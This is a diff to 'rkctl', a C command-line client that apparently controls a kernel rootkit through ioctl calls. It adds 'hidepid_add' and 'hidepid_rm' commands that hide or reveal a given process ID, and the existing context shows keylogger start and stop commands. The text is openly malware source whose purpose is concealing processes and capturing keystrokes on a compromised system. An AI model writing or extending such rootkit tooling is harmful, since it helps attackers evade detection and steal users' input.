@@ -168,6 +168,28 @@ int do_start_key_logger(int argc, const char *argv[]) {
     return do_ioctl_request("start_keylogger", RKCTL_START_KEY_LOGGER, (void *) &addr);
 }
 
+int do_process_hiding(unsigned int request, int argc, const char *argv[]) {
+
+    pid_t pid;
+    char *endptr = NULL;
+
+    if (argc != 3) {
+        printf("[-] rkctl: do_process_hiding() missing pid\n");
+        return -1;
+    }
+
+    /* Parse pid */
+    errno = 0;
+    pid = (pid_t) strtol(argv[2], &endptr, 0);
+
+    if (errno != 0  || *endptr != 0) {
+        printf("[-] rkctl: do_process_hiding() cannot parse pid\n");
+        return -1;
+    }
+
+    return do_ioctl_request("hidepid", request, (void *) pid);
+}
+
 int main(int argc, const char *argv[]) {
 
     const char *cmd;
@@ -202,6 +224,14 @@ int main(int argc, const char *argv[]) {
     } else if (!strcmp(cmd, "keylog_stop")) {
 
         return do_ioctl_request("stop_keylogger", RKCTL_STOP_KEY_LOGGER, NULL);
+
+    } else if (!strcmp(cmd, "hidepid_add")) {
+
+        return do_process_hiding(RKCTL_HIDE_PID_ADD, argc, argv);
+
+    } else if (!strcmp(cmd, "hidepid_rm")) {
+
+        return do_process_hiding(RKCTL_HIDE_PID_RM, argc, argv);
 
     } else {
         printf("[-] rkctl: command not supported\n");
